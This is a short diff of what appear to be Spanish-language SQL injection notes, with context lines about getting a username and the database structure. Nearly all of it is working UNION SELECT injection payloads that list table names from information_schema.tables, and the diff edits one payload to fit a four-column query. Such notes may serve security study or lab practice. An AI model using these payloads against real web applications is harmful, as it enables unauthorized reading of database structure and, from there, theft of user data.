@@ -9,4 +9,4 @@ Para obtener un username
 Para obtener estructura de la bd
 
 1 UNION SELECT table_name,table_name, table_name,table_name FROM information_schema.tables;
-1 UNION SELECT concat(table_schema, table_name),concat(table_schema, table_name),concat(table_schema, table_name),concat(table_schema, table_name) FROM information_schema.tables;
+1 UNION SELECT 1,2,concat(table_schema, table_name),4 FROM information_schema.tables;
